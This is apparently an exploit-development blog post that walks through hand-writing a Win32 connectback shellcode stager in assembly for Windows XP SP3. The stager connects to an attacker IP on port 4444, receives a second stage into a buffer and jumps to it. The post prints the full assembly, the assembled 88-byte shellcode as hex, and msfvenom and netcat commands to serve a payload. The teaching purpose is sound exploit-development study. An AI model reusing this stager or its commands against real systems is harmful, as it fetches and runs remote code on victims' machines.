---
layout: post
title: Exploring What Goes on Behind the Scenes with Win32 Shellcode Stagers
subtitle: A look at how a stager works in Assembly
tags: [assembly, shellcode]
---

I recently challenged myself to manually write a Windows shellcode stager that could be used to create space for second stage shellcode in an exploit. This is usually the realm of Metasploit and not something you want to write yourself, but the best way to learn something is to get your hands dirty. During this exercise I tried to collect resources that would help me recreate a stager, but I came up mostly empty handed. The following is what I wish I had been able to find and read.

There are some resources available for someone looking to write a stager. The first and foremost is Skape’s whitepaper, Understanding Win32 Shellcode. Beyond that, there are a few articles you can find online with little snippets and insights into bits and pieces. The best source after Skape’s paper is MSDN and the pages for the functions used in a Windows stager:

* WSAStartUp: https://msdn.microsoft.com/en-us/library/windows/desktop/ms742213(v=vs.85).aspx
* WSASocketA: https://msdn.microsoft.com/en-us/library/windows/desktop/ms742212(v=vs.85).aspx
* recv: https://msdn.microsoft.com/en-us/library/windows/desktop/ms740121(v=vs.85).aspx
* connect: https://msdn.microsoft.com/en-us/library/windows/desktop/ms737625(v=vs.85).aspx
* bind: https://msdn.microsoft.com/en-us/library/windows/desktop/ms737550(v=vs.85).aspx
* listen: https://msdn.microsoft.com/en-us/library/windows/desktop/ms739168(v=vs.85).aspx
* WSAGetLastError: https://msdn.microsoft.com/en-us/library/windows/desktop/ms741580(v=vs.85).aspx
* Windows Socket Error Codes: https://msdn.microsoft.com/en-us/library/windows/desktop/ms740668(v=vs.85).aspx

I also recommend reviewing Fuzzy Security’s tutorials, especially #6 on Win32 shellcoding. Fuzzy Sec does a great job covering the ins and outs of some of the basics, like how to push function arguments to the stack. The tutorials, but especially #6, are excellent resources for anyone getting started with Win32 shellcode and exploit development.

http://www.fuzzysecurity.com/tutorials/expDev/6.html

# Setting Up a Test Environment

A skeleton test script was setup using Python and `ctypes`. This allowed for quick and easy execution of shellcode without needing to setup a vulnerable application and an exploit. It’s a wonderful way to experiment with new shellcode. There is one caveat: Python won’t load some of the libraries your intended target application might, but that can be fixed by loading the DLL(s) with the functions you intend to use. Also, debugging can be difficult because it’s Python that is executing the shellcode. An easy solution for making it possible to attach a debugger to Python is adding a single breakpoint, `\xcc`, at the start of your shellcode and a user input prompt before shellcode execution:

```python
debug = raw_input("Debug pause!")
```

When the script is run, Python will hit this and wait for input before proceeding. A debugger can be attached to the Python process during this time. After the key press, Python hits the single breakpoint and the debugger will pause. The shellcode commands can then be examined and stepped through.

One additional note on Python and ctypes: shellcode is usually intended to be injected into a running process, not executed like regular code via Python. As Skape mentioned in his paper’s explanation of a connectback stager, `WSAStartUp` is skipped in the paper’s example shellcode because it is assumed the target process will have already called `WSAStartUp`. This is not true for Python and means adding extra bytes and effort, but that is perfect for learning how every step of this process works.

A Python ctypes template script can be found here: https://github.com/chrismaddalena/ExploitDev/tree/master/Practice

To allow that script to work for this stager, add this line below the import statement to load the ws2_32.dll:

```python
ctypes.windll.LoadLibrary("C:\WINDOWS\system32\ws2_32.dll")
```

# Examining the Process

High level languages do a wonderful job obfuscating what it really takes to connect to a port or setup a port to listen for incoming data. All of the steps involve ws2_32.dll, the main Winsock 2.0 library file. From MSDN, “Winsock is an API that allows Windows-based applications to access the transport protocols.” The stager is going to make a lot of use of the Winsock API.

The process from start to finish:

1. Initiate the Windows Winsock API.
2. Request a new socket from Windows.
3. Connect the socket...
    1. Make a call to connect() to connect to an IP and port; or
    2. Make a call to bind() and listen() to listen on a port.
4. Wait to receive data.
5. Do something with that data, like stash it in a buffer and then JMP to it for execution.

{: .box-warning}
**Note:** To explore this process and keep things as simple as possible, all addresses for functions will be hardcoded using addresses from Windows XP Service Pack 3.

## WSAStartUp

The first step is calling `WSAStartUp` to initiate the use of the Winsock API by the current process. The syntax is:

```c
int WSAStartup(
 _In_ WORD wVersionRequested,
 _Out_ LPWSADATA lpWSAData
);
```

This is straight forward. `WSAStartUp` will expect to find two arguments, one setting the highest version the caller can use and a pointer to the `WSADATA` structure. For the version, `WSAStartUp` looks to the high-order byte for the minor version number and the low-order byte to set the major version number.

It is worth mentioning again that this step would be skipped if this shellcode were being injected into, say, an FTP server’s process that was being remotely exploited. Such a process has already loaded ws2_32.dll and called `WSAStartUp` for its use.

It looks like this in Assembly:

```
; Execute WSAStartUp

XOR EBX,EBX        ; Zero EBX
MOV BX,0x0190      ; Set lower bytes to 0x0190
SUB ESP,EBX        ; Subtract EBX from ESP
PUSH ESP           ; Push ESP for lsWSAData
PUSH EBX           ; Push EBX for wVersionRequested

MOV EBX,0x71AB6A55 ; MOV EAX,WS2_32.WSAStartUp
CALL EBX           ; Call WSAStartUp
``` 

## WSASocketA

`WSASocketA` creates a socket that can be used for the stager. There are more arguments for this one:

```c
SOCKET WSASocket(
 _In_ int af,
 _In_ int type,
 _In_ int protocol,
 _In_ LPWSAPROTOCOL_INFO lpProtocolInfo,
 _In_ GROUP g,
 _In_ DWORD dwFlags
);
```

The MSDN documentation has a lot of additional details, but the stager largely ignores the arguments beyond af and type, setting them to 0 or NULL. The socket needed for the stager is `AF_INET` of type `SOCK_STREAM`. If everything works, `WSASocketA` will return a socket descriptor that will be used going forward.

The `AF_INET` represents the Address Family (AF) and will use internet addresses (INET). This means IP addresses. The `SOCK_STREAM` type represents a sequenced, reliable, two-way connection-based byte stream. In other words, the socket is setup for IP addresses and TCP connections.

As an aside, this is what happens when a new socket is created in a high level language like Python, e.g. `s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`. The descriptor is what is stored in the variable and allows for commands like `s.connect((IP, PORT))`.

It looks like this in Assembly:

```
; Setup a new socket using WSASocketA
; If no error occurs, WSASocketA returns a descriptor

XOR EDI,EDI        ; Set EDI to NULL
PUSH EDI           ; Push dwFlags arg -- 0 means no flags
PUSH EDI           ; Push g arg -- 0 means no group operation
PUSH EDI           ; Push lpProtocolInfo arg -- NULL 
PUSH EDI           ; Push the protocol arg -- 0 means no protocol specified
INC EDI            ; Increment EDI to 1
PUSH EDI           ; Push the type argument as 1 (SOCK_STREAM)
INC EDI            ; Increment EDI to 2
PUSH EDI           ; Push af argument as 2 (AF_INET)

MOV EBX,0x71AB8B6A ; MOV EAX,WS2_32.WSASocketA
CALL EBX           ; CALL WSASocketA

MOV EDI,EAX        ; Save socket descriptor in EDI
```

### connect

Now Winsock has been initialized and the above code has stored the socket descriptor in EDI. It is time to connect the socket. The `connect()` function will be used to connect back to the attacking machine and fetch the second stage, but `bind()` and `listen()` could also be used here to bind a port to listen for incoming shellcode. However, that requires twice as many instructions compared to just calling connect and it’s less convenient. The bound port might also be firewalled off, so connect is the preferred option.

The `connect` function is a simple one. This function needs the socket descriptor, a socket address structure (IP address and port number), and a `namelen` argument (the size of the socket address structure).

```c
int connect(
 _In_ SOCKET s,
 _In_ const struct sockaddr *name,
 _In_ int namelen
);
```

This sounds more complicated than it is. The `sockaddr` structure is an IP address and port number. The IP address is pushed to the stack as the hex representation of four individual numbers. They are pushed in reverse order for Little Endian like a memory address would be. If using an online decimal convertor, add a space between each IP octet.

Example: 192.168.228.159 => 159 228 168 192 => 9F E4 A8 C0

Then there is the port. The following example will use port 4444, pushed as 5C11 (115C is 4444 in hex). The one tricky thing seen below is the sin_family. A 2 is added to the end (0x5C110000 becomes 0x5C110002) to represent the AF_INET family. The number code for AF_INET, 2, is consistent with WSASocketA as seen above.

The `namelen` argument is 0x10.

It looks like this in Assembly:

```
; Initiate a connection with connect()

PUSH 0x9FE4A8C0    ; Push IP address -- 192.168.228.159
PUSH WORD 0x5C11   ; 0x115C = port 4444
XOR EBX,EBX        ; Zero EAX
ADD BL,2           ; Add 2 to BL for sin_family, 0x511c0002
PUSH WORD BX       ; Push sin_port and sin_family to stack 
MOV EDX,ESP        ; Move pointer for sin_port and sin_family into EDX
PUSH BYTE 16       ; Push the namelen argument as 0x10
PUSH EDX           ; Push the the pointer to the sockaddr structure
PUSH EDI           ; Push the socket descriptor

MOV EBX,0x71AB4A07 ; MOV EAX,WS2_32.connect
CALL EBX           ; CALL connect
```

## recv

Now the stager can reach out and connect to a listening port, but it has to be told to accept data it is sent and what to do with it. The final step involving Winsock calls the `recv()` function.

```c
int recv(
 _In_ SOCKET s,
 _Out_ char *buf,
 _In_ int len,
 _In_ int flags
);
```

This function takes the socket descriptor and a few other important arguments. The buf argument is a pointer to the buffer created for the received data. The len argument is the length of the buffer that should be created for the incoming data. Then some flags can be set, but they won’t be used in this stager.

Think about the Python command` s.recv(1024)`. It takes the previously referenced `s` variable, a socket descriptor, and tells it to receive incoming data up to 1024 bytes. That’s roughly what will be done here to complete the stager.

This is what it looks like in Assembly:

```
; Use recv() to receive the new buffer of stage 2 shellcode

INC AH             ; Increment EAX to 0x0100 as connect should have returned 0
INC AH             ; Increment EAX to 0x1000
SUB ESP,EAX        ; Allocate 4096 bytes of stack space for use in the recv call
MOV EBP,ESP        ; Save the pointer to the buffer in EBP
XOR ECX,ECX        ; Zero ECX for use as the flags argument
PUSH ECX           ; Push flags arg -- 0 for no flags
PUSH EAX           ; Push len arg -- Size of the buffer for incoming shellcode, 4096
PUSH EBP           ; Push buf arg -- Pointer to output buffer
PUSH EDI           ; Push s arg -- Descriptor returned by WSASocketA

MOV EBX,0x71AB676F ; MOV EAX,WS2_32.recv
CALL EBX           ; CALL recv
```

Calling connect and then recv like this allows for a clever use of connect’s success code. EAX will hold zero if connect was successful, so EAX can be incremented to help the stager make efficient use of registers. Much of this code comes from Skape’s paper and the Connectback IAT example.

With this bit of code added, the reverse connection will now accept returned data and move it into a buffer.

## JMP

The final step is moving to recv’s buffer. That just requires a simple JMP instruction.

```
; Jump to the stage 2 shellcode and execute

JMP EBP            ; Jump into the buffer that was read
```

# Putting it All Together

Each piece of Assembly code can be put together in order and compiled with nasm. Don’t forget to change the IP address!

If the code is saved in a file named stager.asm, that command would be:

`nasm stager.asm -o stager.bin`

That BIN file can then be \x formatted for Python. This can be done manually by opening the BIN file in a hex editor or using a script. The stager comes to 88 bytes. Not bad!

```python
python3 encoder.py --format stager.bin
[+] Formatting complete: 88 bytes
"\x31\xdb\x66\xbb\x90\x01\x29\xdc\x54\x53\xbb\x55\x6a\xab\x71\xff\xd3\x31"
"\xff\x57\x57\x57\x57\x47\x57\x47\x57\xbb\x6a\x8b\xab\x71\xff\xd3\x89\xc7"
"\x68\xc0\xa8\xe4\x9f\x66\x68\x11\x5c\x31\xdb\x80\xc3\x02\x66\x53\x89\xe2"
"\x6a\x10\x52\x57\xbb\x07\x4a\xab\x71\xff\xd3\xfe\xc4\x29\xc4\x89\xe5\x31"
"\xc9\x51\x50\x55\x57\xbb\x6f\x67\xab\x71\xff\xd3\xff\xe5"
```

This example uses the encoder.py found here: https://github.com/chrismaddalena/ExploitDev/tree/master/Encoder

## Test Drive

This stager is a connectback stager, so an attacking machine at the IP address specified in the stager needs to be setup to listen on port 4444 and respond with the second stage. The shellcode needs to be sent as raw bytes. The easiest option is generating a raw payload with msfvenom and saving it in a text file, like so:

`msfvenom -p windows/exec CMD="calc.exe" -f raw > sc.txt`

Then that can be fed into a netcat listener:

`nc -nvlp 4444 < sc.txt`

Running the Python script with the stager shellcode should result in netcat registering a successful connection and calc.exe popping open on the Windows XP VM. Classic!

## Debugging Issues

So, something went wrong? There is actually a very easy way to troubleshoot the sockets using a debugger. A call to the WSAGetLastError function will return the error code of the last Winsock API call. This works for WSAStartUp, WSASocketA, connect, recv, bind, and listen.

Just call WSAGetLastError after one or all of the calls to the Winsock functions. It takes no arguments, so only the address of the function is needed.

```
MOV EBX,0x71AB3CCE ; MOV EAX,WS2_32.WSAGetLastError
CALL EBX           ; CALL WSAGetLastError
```

The debugger will show the returned error message. This can be a 0 for success or an error code with a message that is usually descriptive enough to be understood without referencing the error code webpage. It might say something like “WSANOTINITIALISED” for WSASocketA. That would mean WSAStartUp failed.

# Wrap Up
There is a lot more that can be explored with stagers. This example uses hardcoded addresses. While the addresses can be easily changed for different versions of Windows and different service packs, that is hardly efficient. There are methods for dynamically locating these addresses so the shellcode can be reused across versions of Windows. This is great, but the downside is the stagers get much bigger. Without the WSAStartUp instructions, this stager is just 71 bytes, but it’s currently tied to Windows XP Service Pack 3. Skape’s connectback IAT stager is 162-178 bytes, but it works on more versions of Windows. In some cases, the loss of flexibility is negligible if there is a specific target in mind and space is tight.

Hopefully this article has highlighted some of what goes on behind the scenes with sockets and stagers on Windows platforms and shown some of the pros and cons of using custom shellcode. This example stager is by no means perfect, but it does work.